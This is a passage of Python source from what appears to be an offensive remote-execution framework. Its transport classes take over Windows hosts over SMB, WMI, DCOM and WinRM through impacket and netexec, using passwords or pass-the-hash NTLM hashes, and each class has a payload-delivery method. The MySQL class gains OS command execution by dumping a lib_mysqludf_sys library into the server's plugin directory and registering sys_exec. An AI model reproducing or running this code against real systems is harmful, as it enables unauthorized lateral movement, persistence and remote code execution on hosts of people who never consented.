            return False, "WinRM only supports Windows targets"

        if not self._evil_winrm_available:
            return False, "evil-winrm is required for WinRM payload delivery"

        return self._deliver_via_interactive_evilwinrm(payload)

    def close(self):
        self.connected = False
        self._host = self._username = self._password = self._target_os = None
        self._port = None
        self._ntlm_hash = None
        self._cert_pfx = None
        self._cert_pass = None
        self._use_cert = False
        self._cleanup_temp_dir()

    def _perform_platform_detection(self) -> str:
        return "windows"


class SMBTransport(RemoteTransport):
    def __init__(self):
        super().__init__()
        self._psexec_cmd = None
        self._netexec_available = False

    def _ensure_dependency(self):
        if self._check_command('psexec.py'):
            self._psexec_cmd = 'psexec.py'
        elif self._check_command('impacket-psexec'):
            self._psexec_cmd = 'impacket-psexec'
        else:
            self._psexec_cmd = None

        self._netexec_available = self._check_command('netexec')

        if not (self._psexec_cmd or self._netexec_available):
            raise RemoteTransportError(
                "SMB requires either 'psexec.py' (or 'impacket-psexec') from impacket, or 'netexec'. "
                "Install impacket: pip install impacket, or netexec: pip install netexec"
            )

    def connect(self, host: str, username: str, password: Optional[str] = None, **kwargs) -> bool:
        self._ensure_dependency()
        if kwargs.get('private_key'):
            raise RemoteTransportError("SMB does not support private key authentication")
        ntlm_hash = kwargs.get('ntlm_hash')
        use_nxc = kwargs.get('use_nxc', False)
        port = kwargs.get('port')
        if port is None:
            port = self.DEFAULT_PORTS['smb']
        target_os = kwargs.get('target_os', 'windows')

        if not password and not ntlm_hash:
            raise RemoteTransportError("Password or NTLM hash required for SMB")

        if target_os == 'linux' and not use_nxc:
            raise RemoteTransportError(
                "SMB to Linux targets requires --nxc (netexec), because psexec only supports Windows"
            )
        if use_nxc and not self._netexec_available:
            raise RemoteTransportError("--nxc requested but netexec is not installed")

        self._host = host
        self._username = username
        self._password = password
        self._ntlm_hash = ntlm_hash
        self._target_os = target_os
        self._callback_host = kwargs.get('callback_host')
        self._callback_port = kwargs.get('callback_port')
        self._port = port
        self._use_nxc = use_nxc

        if self._use_nxc:
            return self._connect_nxc(host, username, password, ntlm_hash, port)
        else:
            if not self._psexec_cmd:
                raise RemoteTransportError("No psexec command found (tried psexec.py and impacket-psexec)")
            return self._connect_psexec(host, username, password, ntlm_hash, port)

    def _connect_psexec(self, host: str, username: str, password: Optional[str] = None,
                        ntlm_hash: Optional[str] = None, port: int = 445) -> bool:
        host_spec = f"{host}:{port}" if (port is not None and port != self.DEFAULT_PORTS['smb']) else host
        try:
            if password:
                cmd = [self._psexec_cmd, f'{username}:{password}@{host_spec}', 'cmd.exe', '/c', 'exit']
            elif ntlm_hash:
                cmd = [self._psexec_cmd, f'{username}@{host_spec}', '-hashes', f':{ntlm_hash}', 'cmd.exe', '/c', 'exit']
            else:
                raise RemoteTransportError("Password or NTLM hash required")
            success, stdout, stderr = self._run_command(cmd, timeout=30)
            if success:
                self.connected = True
                return True
            else:
                raise RemoteTransportError(f"{self._psexec_cmd} connection failed: {stderr.strip()}")
        except RemoteTransportError:
            raise
        except Exception as e:
            raise RemoteTransportError(f"{self._psexec_cmd} connection failed: {e}")

    def _connect_nxc(self, host: str, username: str, password: Optional[str] = None,
                     ntlm_hash: Optional[str] = None, port: int = 445) -> bool:
        try:
            cmd = ['netexec', 'smb', host, '-u', username]
            if port is not None and port != self.DEFAULT_PORTS['smb']:
                cmd.extend(['--port', str(port)])
            if ntlm_hash:
                cmd.extend(['-H', ntlm_hash])
            elif password:
                cmd.extend(['-p', password])
            else:
                raise RemoteTransportError("Password or NTLM hash required")
            success, stdout, stderr = self._run_command(cmd, timeout=30)
            output = stdout + stderr
            if success or 'authenticated' in output.lower():
                self.connected = True
                return True
            else:
                raise RemoteTransportError(f"netexec SMB connection failed: {stderr.strip()}")
        except RemoteTransportError:
            raise
        except Exception as e:
            raise RemoteTransportError(f"netexec SMB connection failed: {e}")

    def execute_command(self, command: Union[str, Dict[str, str]], target_os: Optional[str] = None,
                        background: bool = False) -> Tuple[bool, str]:
        if not self.connected:
            return False, "Not connected"
        target_os = target_os or self._target_os or 'windows'
        if isinstance(command, dict):
            command = self._get_os_specific_command(command, target_os)
            if command is None:
                return False, f"No command found for OS: {target_os}"

        if self._use_nxc:
            try:
                cmd = ['netexec', 'smb', self._host, '-u', self._username]
                if self._ntlm_hash:
                    cmd.extend(['-H', self._ntlm_hash])
                elif self._password:
                    cmd.extend(['-p', self._password])
                else:
                    return False, "No authentication available"
                if self._port is not None and self._port != self.DEFAULT_PORTS['smb']:
                    cmd.extend(['--port', str(self._port)])
                if target_os == 'windows':
                    cmd.extend(['-x', command])
                else:
                    cmd.extend(['-X', command])
                timeout = 10 if background else 60
                success, stdout, stderr = self._run_command(cmd, timeout=timeout)
                if success:
                    return True, stdout
                else:
                    return False, stderr
            except Exception as e:
                return False, str(e)
        else:
            if target_os != 'windows':
                return False, "psexec only supports Windows targets. Use --nxc for Linux."
            if not self._psexec_cmd:
                return False, "No psexec command available"
            host_spec = f"{self._host}:{self._port}" if (self._port is not None and self._port != self.DEFAULT_PORTS['smb']) else self._host
            try:
                if self._password:
                    cmd = [self._psexec_cmd, f'{self._username}:{self._password}@{host_spec}', command]
                elif self._ntlm_hash:
                    cmd = [self._psexec_cmd, f'{self._username}@{host_spec}', '-hashes', f':{self._ntlm_hash}', command]
                else:
                    return False, "No authentication available"
                timeout = 10 if background else 60
                success, stdout, stderr = self._run_command(cmd, timeout=timeout)
                if success:
                    return True, stdout
                else:
                    return False, stderr
            except Exception as e:
                return False, str(e)

    def deliver_payload(self, payload: str, target_os: str) -> Tuple[bool, str]:
        return self.execute_command(payload, target_os, background=True)

    def close(self):
        self.connected = False
        self._host = self._username = self._password = self._target_os = None
        self._port = None
        self._ntlm_hash = None

    def _perform_platform_detection(self) -> str:
        return self._target_os if self._target_os in ('windows', 'linux') else 'windows'


class WMITransport(RemoteTransport):
    """WMI transport using wmiexec.py (impacket) or netexec/nxc."""

    def __init__(self):
        super().__init__()
        self._wmiexec_cmd = None
        self._nxc_cmd = None
        self._netexec_available = False

    def _ensure_dependency(self):
        if self._check_command('wmiexec.py'):
            self._wmiexec_cmd = 'wmiexec.py'
        elif self._check_command('impacket-wmiexec'):
            self._wmiexec_cmd = 'impacket-wmiexec'
        else:
            self._wmiexec_cmd = None

        if self._check_command('nxc'):
            self._nxc_cmd = 'nxc'
        elif self._check_command('netexec'):
            self._nxc_cmd = 'netexec'
        else:
            self._nxc_cmd = None
        self._netexec_available = self._nxc_cmd is not None

        if not (self._wmiexec_cmd or self._netexec_available):
            raise RemoteTransportError(
                "WMI requires either 'wmiexec.py' (or 'impacket-wmiexec') from impacket, or 'nxc'/'netexec'. "
                "Install impacket: pip install impacket, or netexec: pip install netexec"
            )

    def connect(self, host: str, username: str, password: Optional[str] = None, **kwargs) -> bool:
        self._ensure_dependency()
        if kwargs.get('private_key'):
            raise RemoteTransportError("WMI does not support private key authentication")
        ntlm_hash = kwargs.get('ntlm_hash')
        use_nxc = kwargs.get('use_nxc', False)
        port = kwargs.get('port')
        if port is None:
            port = self.DEFAULT_PORTS['wmi']
        target_os = kwargs.get('target_os', 'windows')
        callback_host = kwargs.get('callback_host')
        callback_port = kwargs.get('callback_port')

        if not password and not ntlm_hash:
            raise RemoteTransportError("Password or NTLM hash required for WMI")

        if target_os != 'windows':
            raise RemoteTransportError("WMI only supports Windows targets")

        self._host = host
        self._username = username
        self._password = password
        self._ntlm_hash = ntlm_hash
        self._target_os = target_os
        self._callback_host = callback_host
        self._callback_port = callback_port
        self._port = port
        self._use_nxc = use_nxc

        if self._use_nxc:
            if not self._netexec_available:
                raise RemoteTransportError("netexec/nxc not available for WMI")
            return self._connect_nxc(host, username, password, ntlm_hash, port)
        else:
            if not self._wmiexec_cmd:
                raise RemoteTransportError("No wmiexec command found (tried wmiexec.py and impacket-wmiexec)")
            return self._connect_wmiexec(host, username, password, ntlm_hash, port)

    def _connect_wmiexec(self, host: str, username: str, password: Optional[str] = None,
                         ntlm_hash: Optional[str] = None, port: Optional[int] = None) -> bool:
        host_spec = f"{host}:{port}" if port else host
        try:
            if password:
                cmd = [self._wmiexec_cmd, f'{username}:{password}@{host_spec}', 'cmd.exe', '/c', 'exit']
            elif ntlm_hash:
                cmd = [self._wmiexec_cmd, f'{username}@{host_spec}', '-hashes', f':{ntlm_hash}', 'cmd.exe', '/c', 'exit']
            else:
                raise RemoteTransportError("Password or NTLM hash required")
            success, stdout, stderr = self._run_command(cmd, timeout=30)
            if success:
                self.connected = True
                return True
            else:
                raise RemoteTransportError(f"{self._wmiexec_cmd} connection failed: {stderr.strip()}")
        except RemoteTransportError:
            raise
        except Exception as e:
            raise RemoteTransportError(f"{self._wmiexec_cmd} connection failed: {e}")

    def _connect_nxc(self, host: str, username: str, password: Optional[str] = None,
                     ntlm_hash: Optional[str] = None, port: Optional[int] = None) -> bool:
        try:
            cmd = [self._nxc_cmd, 'wmi', host, '-u', username]
            if port:
                cmd.extend(['--port', str(port)])
            if ntlm_hash:
                cmd.extend(['-H', ntlm_hash])
            elif password:
                cmd.extend(['-p', password])
            else:
                raise RemoteTransportError("Password or NTLM hash required")
            cmd.extend(['-x', 'exit'])
            success, stdout, stderr = self._run_command(cmd, timeout=30)
            output = stdout + stderr
            if success or 'authenticated' in output.lower():
                self.connected = True
                return True
            else:
                raise RemoteTransportError(f"{self._nxc_cmd} WMI connection failed: {stderr.strip()}")
        except RemoteTransportError:
            raise
        except Exception as e:
            raise RemoteTransportError(f"{self._nxc_cmd} WMI connection failed: {e}")

    def execute_command(self, command: Union[str, Dict[str, str]], target_os: Optional[str] = None,
                        background: bool = False) -> Tuple[bool, str]:
        if not self.connected:
            return False, "Not connected"
        target_os = target_os or self._target_os or 'windows'
        if target_os != 'windows':
            return False, "WMI only supports Windows targets"
        if isinstance(command, dict):
            command = self._get_os_specific_command(command, target_os)
            if command is None:
                return False, f"No command found for OS: {target_os}"

        if self._use_nxc:
            try:
                cmd = [self._nxc_cmd, 'wmi', self._host, '-u', self._username]
                if self._ntlm_hash:
                    cmd.extend(['-H', self._ntlm_hash])
                elif self._password:
                    cmd.extend(['-p', self._password])
                else:
                    return False, "No authentication available"
                if self._port:
                    cmd.extend(['--port', str(self._port)])
                cmd.extend(['-x', command])
                timeout = 10 if background else 60
                success, stdout, stderr = self._run_command(cmd, timeout=timeout)
                if success:
                    return True, stdout
                else:
                    return False, stderr
            except Exception as e:
                return False, str(e)
        else:
            if not self._wmiexec_cmd:
                return False, "No wmiexec command available"
            host_spec = f"{self._host}:{self._port}" if self._port else self._host
            try:
                if self._password:
                    cmd = [self._wmiexec_cmd, f'{self._username}:{self._password}@{host_spec}', command]
                elif self._ntlm_hash:
                    cmd = [self._wmiexec_cmd, f'{self._username}@{host_spec}', '-hashes', f':{self._ntlm_hash}', command]
                else:
                    return False, "No authentication available"
                timeout = 10 if background else 60
                success, stdout, stderr = self._run_command(cmd, timeout=timeout)
                if success:
                    return True, stdout
                else:
                    return False, stderr
            except Exception as e:
                return False, str(e)

    def deliver_payload(self, payload: str, target_os: str) -> Tuple[bool, str]:
        return self.execute_command(payload, target_os, background=True)

    def close(self):
        self.connected = False
        self._host = self._username = self._password = self._target_os = None
        self._port = None
        self._ntlm_hash = None

    def _perform_platform_detection(self) -> str:
        return "windows"


class DCOMTransport(RemoteTransport):

    def __init__(self):
        super().__init__()
        self._dcomexec_cmd = None

    def _ensure_dependency(self):
        if self._check_command('dcomexec.py'):
            self._dcomexec_cmd = 'dcomexec.py'
        elif self._check_command('impacket-dcomexec'):
            self._dcomexec_cmd = 'impacket-dcomexec'
        else:
            self._dcomexec_cmd = None

        if not self._dcomexec_cmd:
            raise RemoteTransportError(
                "DCOM requires 'dcomexec.py' (or 'impacket-dcomexec') from impacket. "
                "Install impacket: pip install impacket"
            )

    def connect(self, host: str, username: str, password: Optional[str] = None, **kwargs) -> bool:
        self._ensure_dependency()
        if kwargs.get('private_key'):
            raise RemoteTransportError("DCOM does not support private key authentication")

        ntlm_hash = kwargs.get('ntlm_hash')
        port = kwargs.get('port')
        if port is None:
            port = self.DEFAULT_PORTS['dcom']
        target_os = kwargs.get('target_os', 'windows')

        if not password and not ntlm_hash:
            raise RemoteTransportError("Password or NTLM hash required for DCOM")
        if target_os != 'windows':
            raise RemoteTransportError("DCOM only supports Windows targets")

        self._host = host
        self._username = username
        self._password = password
        self._ntlm_hash = ntlm_hash
        self._target_os = target_os
        self._callback_host = kwargs.get('callback_host')
        self._callback_port = kwargs.get('callback_port')
        self._port = port
        self._use_nxc = False

        return self._connect_probe(host, username, password, ntlm_hash, port)

    def _connect_probe(self, host: str, username: str, password: Optional[str],
                       ntlm_hash: Optional[str], port: int) -> bool:
        host_spec = f"{host}:{port}" if (port and port != self.DEFAULT_PORTS['dcom']) else host
        try:
            if password:
                cmd = [self._dcomexec_cmd, f'{username}:{password}@{host_spec}', 'cmd.exe', '/c', 'exit']
            else:
                cmd = [self._dcomexec_cmd, f'{username}@{host_spec}', '-hashes', f':{ntlm_hash}',
                       'cmd.exe', '/c', 'exit']
            success, stdout, stderr = self._run_command(cmd, timeout=30)
            if success:
                self.connected = True
                return True
            raise RemoteTransportError(f"dcomexec connection failed: {stderr.strip()}")
        except RemoteTransportError:
            raise
        except Exception as e:
            raise RemoteTransportError(f"dcomexec connection failed: {e}")

    def execute_command(self, command: Union[str, Dict[str, str]], target_os: Optional[str] = None,
                        background: bool = False) -> Tuple[bool, str]:
        if not self.connected:
            return False, "Not connected"
        target_os = target_os or self._target_os or 'windows'
        if target_os != 'windows':
            return False, "DCOM only supports Windows targets"
        if isinstance(command, dict):
            command = self._get_os_specific_command(command, target_os)
            if command is None:
                return False, f"No command found for OS: {target_os}"

        host_spec = f"{self._host}:{self._port}" if (self._port and self._port != self.DEFAULT_PORTS['dcom']) else self._host
        try:
            if self._password:
                cmd = [self._dcomexec_cmd, f'{self._username}:{self._password}@{host_spec}', command]
            elif self._ntlm_hash:
                cmd = [self._dcomexec_cmd, f'{self._username}@{host_spec}', '-hashes',
                       f':{self._ntlm_hash}', command]
            else:
                return False, "No authentication available"
            timeout = 10 if background else 60
            success, stdout, stderr = self._run_command(cmd, timeout=timeout)
            if success:
                return True, stdout
            return False, stderr
        except Exception as e:
            return False, str(e)

    def deliver_payload(self, payload: str, target_os: str) -> Tuple[bool, str]:
        return self.execute_command(payload, target_os, background=True)

    def close(self):
        self.connected = False
        self._host = self._username = self._password = self._target_os = None
        self._port = None
        self._ntlm_hash = None

    def _perform_platform_detection(self) -> str:
        return "windows"


class MySQLTransport(RemoteTransport):

    UDF_FUNC_NAMES = ('sys_exec', 'sys_eval')

    CONNECT_TIMEOUT_FAST = 10
    CONNECT_TIMEOUT_SLOW = 60

    def __init__(self):
        super().__init__()
        self._mysql_cmd = None
        self._exec_method = None
        self._udf_binary_path = None
        self._secure_file_priv = None
        self._plugin_dir = None
        self._version = None
        self._capabilities = {}
        self._connect_timeout = self.CONNECT_TIMEOUT_FAST
        self._udf_load_reason = None
        self._target_arch = None
        self._install_authorized = False

    def _ensure_dependency(self):
        for cand in ('mysql', 'mariadb'):
            if self._check_command(cand):
                self._mysql_cmd = cand
                return
        raise RemoteTransportError(
            "MySQL transport requires the 'mysql' or 'mariadb' client. "
            "Install with: apt install default-mysql-client (or mariadb-client)"
        )

    def _build_client_cmd(self, sql: Optional[str] = None) -> List[str]:
        cmd = [
            self._mysql_cmd,
            '-h', self._host,
            '-P', str(self._port),
            '-u', self._username,
            '--protocol=TCP',
            '--batch', '--skip-column-names',
            f'--connect-timeout={self._connect_timeout}',
        ]
        if self._password:
            cmd.append(f'-p{self._password}')
        if sql is not None:
            cmd.extend(['-e', sql])
        return cmd

    def _run_sql(self, sql: str, timeout: Optional[int] = None) -> Tuple[bool, str, str]:
        if timeout is None:
            timeout = max(30, self._connect_timeout + 20)
        return self._run_command(self._build_client_cmd(sql), timeout=timeout)

    @staticmethod
    def _sql_str(s: str) -> str:
        return s.replace('\\', '\\\\').replace("'", "''")

    @staticmethod
    def _looks_like_reverse_dns_timeout(err: str) -> bool:
        if not err:
            return False
        s = err.lower()
        if 'reading initial communication packet' in s:
            return True
        if 'lost connection to server' in s and 'handshake' in s:
            return True
        return False

    @staticmethod
    def _normalize_arch(raw: Optional[str]) -> Optional[str]:
        if not raw:
            return None
        a = raw.strip().lower()
        if a in ('x86_64', 'amd64', 'x64'):
            return 'x86_64'
        if a in ('aarch64', 'arm64'):
            return 'aarch64'
        if a in ('i386', 'i486', 'i586', 'i686', 'x86'):
            return 'x86'
        return a

    def _probe_target_arch(self) -> Optional[str]:
        ok, out, _ = self._run_sql("SELECT @@version_compile_machine")
        if ok and out.strip():
            return self._normalize_arch(out)
        return None

    def _probe_existing_udf(self) -> Optional[str]:
        ok, out, _ = self._run_sql(
            "SELECT name FROM mysql.func WHERE name IN ('sys_exec','sys_eval')"
        )
        if ok and out.strip():
            for line in out.splitlines():
                name = line.strip()
                if name in self.UDF_FUNC_NAMES:
                    return name
        for fn in self.UDF_FUNC_NAMES:
            ok, _, _ = self._run_sql(f"SELECT {fn}('echo __probe__')")
            if ok:
                return fn
        return None

    def _user_has_file_privilege(self) -> Tuple[bool, str]:
        ok, out, _ = self._run_sql("SHOW GRANTS")
        if not ok:
            return False, "Could not read SHOW GRANTS output"
        text = (out or '').upper()
        compact = ' '.join(text.split())
        if 'ALL PRIVILEGES ON *.*' in compact:
            return True, "ALL PRIVILEGES on *.*"
        if 'GRANT FILE ' in compact or ', FILE,' in compact or ', FILE ' in compact:
            return True, "FILE privilege present"
        return False, "FILE privilege not present in SHOW GRANTS"

    def _secure_file_priv_status(self, path: str) -> Tuple[bool, str]:
        sfp = self._secure_file_priv
        if sfp is None:
            return False, "Could not read @@secure_file_priv"
        if sfp == 'NULL':
            return False, (
                "secure_file_priv = NULL — file import/export is fully "
                "disabled on this server"
            )
        if sfp == '':
            return True, "secure_file_priv is unrestricted ('')"
        if path.startswith(sfp):
            return True, f"secure_file_priv = {sfp!r}, target path is inside"
        return False, (
            f"secure_file_priv = {sfp!r} does not prefix target path {path!r}"
        )

    def _gather_capabilities(self) -> Dict[str, Any]:
        caps: Dict[str, Any] = {
            'version': None,
            'compile_os': None,
            'compile_machine': None,
            'current_user': None,
            'plugin_dir': None,
            'secure_file_priv': None,
            'grants': [],
            'has_file_privilege': False,
            'file_privilege_reason': None,
            'secure_file_priv_ok': None,
            'secure_file_priv_reason': None,
            'udf_existing': None,
            'plugin_dir_writable_path': None,
        }

        ok, out, _ = self._run_sql("SELECT VERSION()")
        caps['version'] = out.strip() if ok else None

        ok, out, _ = self._run_sql("SELECT @@version_compile_os")
        caps['compile_os'] = out.strip() if ok else None

        ok, out, _ = self._run_sql("SELECT @@version_compile_machine")
        if ok and out.strip():
            caps['compile_machine'] = out.strip()
            self._target_arch = self._normalize_arch(out)

        ok, out, _ = self._run_sql("SELECT CURRENT_USER()")
        caps['current_user'] = out.strip() if ok else None

        ok, out, _ = self._run_sql("SELECT @@plugin_dir")
        caps['plugin_dir'] = out.strip() if ok else None
        self._plugin_dir = caps['plugin_dir']

        ok, out, _ = self._run_sql("SELECT @@secure_file_priv")
        caps['secure_file_priv'] = out.strip() if ok else None
        self._secure_file_priv = caps['secure_file_priv']

        ok, out, _ = self._run_sql("SHOW GRANTS")
        if ok:
            caps['grants'] = [ln.strip() for ln in (out or '').splitlines() if ln.strip()]

        has_file, file_reason = self._user_has_file_privilege()
        caps['has_file_privilege'] = has_file
        caps['file_privilege_reason'] = file_reason

        if caps['plugin_dir']:
            soname = 'lib_mysqludf_sys.dll' if self._target_os == 'windows' else 'lib_mysqludf_sys.so'
            target_path = caps['plugin_dir'].rstrip('/\\') + '/' + soname
            caps['plugin_dir_writable_path'] = target_path
            ok_sfp, sfp_reason = self._secure_file_priv_status(target_path)
            caps['secure_file_priv_ok'] = ok_sfp
            caps['secure_file_priv_reason'] = sfp_reason
        else:
            caps['secure_file_priv_ok'] = False
            caps['secure_file_priv_reason'] = "plugin_dir is empty — nothing to write into"

        caps['udf_existing'] = self._probe_existing_udf()

        self._version = caps['version']
        self._capabilities = caps
        return caps

    def _download_one_udf(self, url: str, dest: str) -> bool:
        try:
            tmp = dest + '.part'
            with urllib.request.urlopen(url, timeout=60) as resp:
                with open(tmp, 'wb') as fh:
                    shutil.copyfileobj(resp, fh)
            os.replace(tmp, dest)
            try:
                os.chmod(dest, os.stat(dest).st_mode | stat.S_IRUSR | stat.S_IWUSR)
            except Exception:
                pass
            return True
        except Exception:
            try:
                if os.path.isfile(dest + '.part'):
                    os.remove(dest + '.part')
            except Exception:
                pass
            return False

    def _prefetch_udf_libraries(self) -> None:
        try:
            os.makedirs(UDF_LIB_DIR, exist_ok=True)
        except Exception:
            return

        seen_sonames = set()
        for (os_name, _arch), url in UDF_DOWNLOAD_URLS.items():
            soname = UDF_SONAMES.get(os_name)
            if not soname or soname in seen_sonames:
                continue
            seen_sonames.add(soname)

            dest = os.path.join(UDF_LIB_DIR, soname)
            if os.path.isfile(dest):
                continue

            self._download_one_udf(url, dest)

    def _ensure_udf_library(self, target_os: str) -> Optional[str]:
        if target_os == 'unix':
            target_os = 'linux'

        soname = UDF_SONAMES.get(target_os)
        if not soname:
            return None

        try:
            os.makedirs(UDF_LIB_DIR, exist_ok=True)
        except Exception as exc:
            raise RemoteTransportError(
                f"Could not create UDF library directory {UDF_LIB_DIR}: {exc}"
            )

        dest = os.path.join(UDF_LIB_DIR, soname)
        if os.path.isfile(dest):
            return dest

        target_arch = self._target_arch or self._probe_target_arch()
        if not target_arch:
            target_arch = self._normalize_arch(platform.machine())

        if not target_arch:
            return None

        url = UDF_DOWNLOAD_URLS.get((target_os, target_arch))
        if not url:
            return None

        if self._download_one_udf(url, dest):
            return dest
        return None

    def _prepare_udf_library(self, target_os: str) -> bool:
        if self._udf_binary_path and os.path.isfile(self._udf_binary_path):
            return True
        self._udf_binary_path = self._ensure_udf_library(target_os)
        return bool(self._udf_binary_path and os.path.isfile(self._udf_binary_path))

    def _try_load_udf(self) -> bool:
        try:
            with open(self._udf_binary_path, 'rb') as fh:
                blob = fh.read()
        except Exception as exc:
            self._udf_load_reason = f"Could not read local UDF binary: {exc}"
            return False

        soname = ('lib_mysqludf_sys.dll' if self._target_os == 'windows'
                  else 'lib_mysqludf_sys.so')
        target_path = self._capabilities.get('plugin_dir_writable_path')
        if not target_path:
            self._udf_load_reason = "No target path resolved for the UDF"
            return False

        hex_blob = blob.hex()
        ok, out, err = self._run_sql(
            f"SELECT 0x{hex_blob} INTO DUMPFILE '{self._sql_str(target_path)}'",
            timeout=60,
        )
        if not ok:
            self._udf_load_reason = (
                f"INTO DUMPFILE to {target_path!r} failed: "
                f"{(err or out or '').strip()}"
            )
            return False

        ok, out, err = self._run_sql(
            f"CREATE FUNCTION sys_exec RETURNS INTEGER SONAME '{self._sql_str(soname)}'"
        )
        if not ok:
            self._run_sql("DROP FUNCTION IF EXISTS sys_exec")
            ok, out, err = self._run_sql(
                f"CREATE FUNCTION sys_exec RETURNS INTEGER SONAME '{self._sql_str(soname)}'"
            )
            if not ok:
                self._udf_load_reason = (
                    f"CREATE FUNCTION ... SONAME '{soname}' failed: "
                    f"{(err or out or '').strip()}"
                )
                return False

        ok, out, err = self._run_sql("SELECT sys_exec('echo __ok__')")
        if not ok:
            self._udf_load_reason = (
                f"UDF registered but sys_exec() call failed: "
                f"{(err or out or '').strip()}"
            )
            return False
        return True

    def _plan_and_enable(self) -> None:
        caps = self._gather_capabilities()

        if caps['udf_existing']:
            self._exec_method = caps['udf_existing']
            return

        problems: List[str] = []

        if not caps['plugin_dir']:
            problems.append("plugin_dir is empty — the server does not "
                            "expose a UDF directory")

        if not caps['has_file_privilege']:
            problems.append(
                f"missing FILE privilege ({caps['file_privilege_reason']}) — "
                "INTO DUMPFILE is refused without it"
            )

        if caps['secure_file_priv_ok'] is False:
            problems.append(
                f"secure_file_priv blocks the target path "
                f"({caps['secure_file_priv_reason']})"
            )

        if problems:
            raise RemoteTransportError(
                self._format_capability_failure(
                    caps,
                    "MySQL command execution is not enabled, and this "
                    "session is not permitted to install the UDF.",
                    problems,
                )
            )

        if not self._install_authorized:
            raise RemoteTransportError(
                self._format_ready_for_install(caps)
            )

        if not self._prepare_udf_library(self._target_os):
            target_arch = self._target_arch or self._normalize_arch(platform.machine()) or '?'
            raise RemoteTransportError(
                self._format_capability_failure(
                    caps,
                    "MySQL command execution was authorized, but no local "
                    "UDF binary is available to install.",
                    [f"missing local UDF binary in {UDF_LIB_DIR} "
                     f"(no download URL configured for "
                     f"{self._target_os}/{target_arch}) — "
                     f"place lib_mysqludf_sys.so/.dll there, or pass "
                     f"--mysql-udf with an explicit path"],
                )
            )

        if not self._try_load_udf():
            raise RemoteTransportError(
                self._format_capability_failure(
                    caps,
                    "MySQL command execution could not be enabled even "
                    "though the preflight checks passed.",
                    [self._udf_load_reason or "unknown reason"],
                )
            )

        self._exec_method = 'sys_exec'

    def _format_capability_failure(self, caps: Dict[str, Any],
                                   headline: str,
                                   problems: List[str]) -> str:
        grants_preview = caps.get('grants') or []
        grants_text = '\n'.join(f"    {g}" for g in grants_preview) or "    (none)"
        problem_text = '\n'.join(f"  - {p}" for p in problems)
        return (
            f"{headline}\n"
            f"  current_user:       {caps.get('current_user')}\n"
            f"  version:            {caps.get('version')}\n"
            f"  compile_os:         {caps.get('compile_os')}\n"
            f"  compile_machine:    {caps.get('compile_machine')}\n"
            f"  plugin_dir:         {caps.get('plugin_dir')}\n"
            f"  secure_file_priv:   {caps.get('secure_file_priv')}\n"
            f"  udf_existing:       {caps.get('udf_existing') or 'no'}\n"
            f"  udf dir (local):    {UDF_LIB_DIR}\n"
            f"Problems:\n{problem_text}\n"
            f"  grants:\n{grants_text}\n"
            f"Options:\n"
            f"  * Load lib_mysqludf_sys manually on the target, then retry.\n"
            f"  * Place lib_mysqludf_sys.so (or .dll) in the local UDF directory\n"
            f"    shown above, or pass --mysql-udf with an explicit path.\n"
            f"  * Fix the server-side blockers listed under Problems and retry."
        )

    def _format_ready_for_install(self, caps: Dict[str, Any]) -> str:
        soname = 'lib_mysqludf_sys.dll' if self._target_os == 'windows' else 'lib_mysqludf_sys.so'
        target_path = caps.get('plugin_dir_writable_path') or '(unknown)'
        local_binary = os.path.join(UDF_LIB_DIR, soname)
        local_present = os.path.isfile(local_binary)

        if local_present:
            binary_hint = (
                f"--mysql-udf                (uses cached {local_binary})\n"
                f"  --mysql-udf /path/to/{soname}  (uses an explicit file)"
            )
        else:
            binary_hint = (
                f"--mysql-udf /path/to/{soname}\n"
                f"    (no cached binary in {UDF_LIB_DIR} — supply the file "
                f"explicitly, or place it there and re-run)"
            )

        return (
            "MySQL command execution readiness check passed. No UDF is\n"
            "currently loaded, but this session is permitted to install one.\n"
            "\n"
            f"  current_user:       {caps.get('current_user')}\n"
            f"  version:            {caps.get('version')}\n"
            f"  compile_os:         {caps.get('compile_os')}\n"
            f"  compile_machine:    {caps.get('compile_machine')}\n"
            f"  plugin_dir:         {caps.get('plugin_dir')}\n"
            f"  secure_file_priv:   {caps.get('secure_file_priv')}\n"
            f"  file privilege:     yes ({caps.get('file_privilege_reason')})\n"
            f"  udf_existing:       no\n"
            f"  target binary path: {target_path}\n"
            f"  udf dir (local):    {UDF_LIB_DIR}\n"
            f"  local binary:       {'present' if local_present else 'not present'}\n"
            "\n"
            "Installation was not attempted, because the transport only\n"
            "probes by default. Re-run the same command with --mysql-udf\n"
            "to authorize the write and continue to command execution:\n"
            "\n"
            f"  {binary_hint}\n"
            "\n"
            "Installing the UDF writes a shared library into plugin_dir and\n"
            "registers sys_exec() on the server. Both steps are persistent\n"
            "and can be reverted with DROP FUNCTION sys_exec."
        )

    def connect(self, host: str, username: str, password: Optional[str] = None, **kwargs) -> bool:
        self._ensure_dependency()
        if kwargs.get('private_key'):
            raise RemoteTransportError("MySQL does not support private key authentication")
        if kwargs.get('ntlm_hash'):
            raise RemoteTransportError("MySQL does not support NTLM hash authentication")

        port = kwargs.get('port') or self.DEFAULT_PORTS['mysql']
        target_os = kwargs.get('target_os', 'linux')

        self._host = host
        self._username = username
        self._password = password
        self._target_os = target_os
        self._callback_host = kwargs.get('callback_host')
        self._callback_port = kwargs.get('callback_port')
        self._port = port
        self._use_nxc = False
        self._connect_timeout = self.CONNECT_TIMEOUT_FAST
        self._udf_load_reason = None
        self._target_arch = None

        mysql_udf = kwargs.get('mysql_udf')
        if mysql_udf == 'auto':
            self._install_authorized = True
            self._udf_binary_path = None
        elif mysql_udf:
            self._install_authorized = True
            self._udf_binary_path = mysql_udf
        else:
            self._install_authorized = False
            self._udf_binary_path = None

        self._prefetch_udf_libraries()

        ok, out, err = self._run_sql("SELECT 1")
        if not ok and self._looks_like_reverse_dns_timeout(err):
            self._connect_timeout = self.CONNECT_TIMEOUT_SLOW
            ok, out, err = self._run_sql("SELECT 1")

        if not ok:
            err_text = (err or out or '').strip()
            hint = ''
            if self._looks_like_reverse_dns_timeout(err_text):
                hint = (
                    "\n\nThis is MySQL blocking on a reverse DNS lookup of "
                    "the client IP before sending its greeting packet.\n"
                    "The proper fix is server-side and permanent:\n"
                    "  add 'skip-name-resolve' under [mysqld] in my.cnf,\n"
                    "  then restart mysqld."
                )
            raise RemoteTransportError(
                f"MySQL connection failed: {err_text}{hint}"
            )

        self._plan_and_enable()

        self.connected = True
        return True

    def _exec_via_udf(self, command: str) -> Tuple[bool, str]:
        fn = self._exec_method or 'sys_exec'
        sql = f"SELECT {fn}('{self._sql_str(command)}')"
        ok, out, err = self._run_sql(sql, timeout=60)
        if ok:
            return True, out
        return False, err or out

    def execute_command(self, command: Union[str, Dict[str, str]], target_os: Optional[str] = None,
                        background: bool = False) -> Tuple[bool, str]:
